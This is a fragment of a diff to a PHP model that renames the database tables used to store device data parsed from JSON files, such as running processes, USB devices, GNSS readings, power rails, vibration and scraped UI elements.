             log_message('info', '[parse_running_processes] Inserted ' . count($batch) . ' detailed processes from ' . $file_name);
@@ -3593,7 +3593,7 @@ public function parse_misc_software(string $file_name, int $owner_id, string $de
 
             $extracted_at = $json['extracted_at'] ?? null;
 
-            $exists = $this->db->table('tbl_audio_devices')
+            $exists = $this->db->table('tbl_telemetry_audio_devices')
                 ->where('device_id', $device_id)
                 ->where('extracted_at', $extracted_at)
                 ->countAllResults() > 0;
@@ -3630,7 +3630,7 @@ public function parse_misc_software(string $file_name, int $owner_id, string $de
                     ];
                 }
                 if (!empty($deviceBatch)) {
-                    $this->db->table('tbl_audio_devices')->insertBatch($deviceBatch);
+                    $this->db->table('tbl_telemetry_audio_devices')->insertBatch($deviceBatch);
                 }
             }
 
@@ -3741,7 +3741,7 @@ public function parse_misc_software(string $file_name, int $owner_id, string $de
 
             $extracted_at = $json['extracted_at'] ?? null;
 
-            $exists = $this->db->table('tbl_gnss_hardware')
+            $exists = $this->db->table('tbl_telemetry_gnss_hardware')
                 ->where('device_id', $device_id)
                 ->where('extracted_at', $extracted_at)
                 ->countAllResults() > 0;
@@ -3777,7 +3777,7 @@ public function parse_misc_software(string $file_name, int $owner_id, string $de
                 'updated_at' => $dated,
             ];
 
-            $this->db->table('tbl_gnss_hardware')->insert($data);
+            $this->db->table('tbl_telemetry_gnss_hardware')->insert($data);
             log_message('info', '[parse_gnss_hardware] Inserted GNSS snapshot for device: ' . $device_id);
             return true;
 
@@ -3809,7 +3809,7 @@ public function parse_misc_software(string $file_name, int $owner_id, string $de
                 $railName = $rail['rail_name'] ?? null;
                 if (!$railName) continue;
 
-                $exists = $this->db->table('tbl_power_rails')
+                $exists = $this->db->table('tbl_telemetry_power_rails')
                     ->where('owner_id', $owner_id)
                     ->where('device_id', $device_id)
                     ->where('rail_name', $railName)
@@ -3849,7 +3849,7 @@ public function parse_misc_software(string $file_name, int $owner_id, string $de
             }
 
             if (!empty($batch)) {
-                $this->db->table('tbl_power_rails')->insertBatch($batch);
+                $this->db->table('tbl_telemetry_power_rails')->insertBatch($batch);
             }
 
             log_message('info', '[parse_power_rails] Inserted ' . count($batch) . ' power rails from ' . $file_name);
@@ -3883,7 +3883,7 @@ public function parse_misc_software(string $file_name, int $owner_id, string $de
                 $usbId = $dev['device_id'] ?? null;
                 if ($usbId === null) continue;
 
-                $exists = $this->db->table('tbl_usb_devices')
+                $exists = $this->db->table('tbl_telemetry_usb_devices')
                     ->where('owner_id', $owner_id)
                     ->where('device_id', $device_id)
                     ->where('usb_device_id', $usbId)
@@ -3924,7 +3924,7 @@ public function parse_misc_software(string $file_name, int $owner_id, string $de
             }
 
             if (!empty($batch)) {
-                $this->db->table('tbl_usb_devices')->insertBatch($batch);
+                $this->db->table('tbl_telemetry_usb_devices')->insertBatch($batch);
             }
 
             log_message('info', '[parse_usb_devices] Inserted ' . count($batch) . ' USB devices from ' . $file_name);
@@ -3951,7 +3951,7 @@ public function parse_misc_software(string $file_name, int $owner_id, string $de
 
             $extracted_at = $json['extracted_at'] ?? null;
 
-            $exists = $this->db->table('tbl_vibration')
+            $exists = $this->db->table('tbl_telemetry_vibration')
                 ->where('device_id', $device_id)
                 ->where('extracted_at', $extracted_at)
                 ->countAllResults() > 0;
@@ -3981,7 +3981,7 @@ public function parse_misc_software(string $file_name, int $owner_id, string $de
                 'updated_at' => $dated,
             ];
 
-            $this->db->table('tbl_vibration')->insert($data);
+            $this->db->table('tbl_telemetry_vibration')->insert($data);
             log_message('info', '[parse_vibration] Inserted vibration snapshot for device: ' . $device_id);
             return true;
 
@@ -4090,7 +4090,7 @@ public function parse_misc_hardware(string $file_name, int $owner_id, string $de
     }
 
     /**
-     * Parse scraped UI elements log and insert into tbl_ui_scrape.
+     * Parse scraped UI elements log and insert into tbl_extracted_ui_scrapes.
      * File prefix: UI scraper data under composite 'misc_software'
      */
     public function parse_ui_scrape(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
@@ -4119,7 +4119,7 @@ public function parse_misc_hardware(string $file_name, int $owner_id, string $de
                 $timestamp = $item['event_timestamp'] ?? $item['timestamp'] ?? null;
                 if (!$pkg || !$timestamp) continue;
 
-                $exists = $this->db->table('tbl_ui_scrape')
+                $exists = $this->db->table('tbl_extracted_ui_scrapes')
                     ->where('owner_id', $owner_id)
                     ->where('device_id', $device_id)
                     ->where('package_name', $pkg)
@@ -4142,7 +4142,7 @@ public function parse_misc_hardware(string $file_name, int $owner_id, string $de
             }
 
             if (!empty($batch)) {
-                $this->db->table('tbl_ui_scrape')->insertBatch($batch);
+                $this->db->table('tbl_extracted_ui_scrapes')->insertBatch($batch);
             }
 
             log_message('info', '[parse_ui_scrape] Inserted ' . count($batch) . ' scraped UI elements from ' . $file_name);
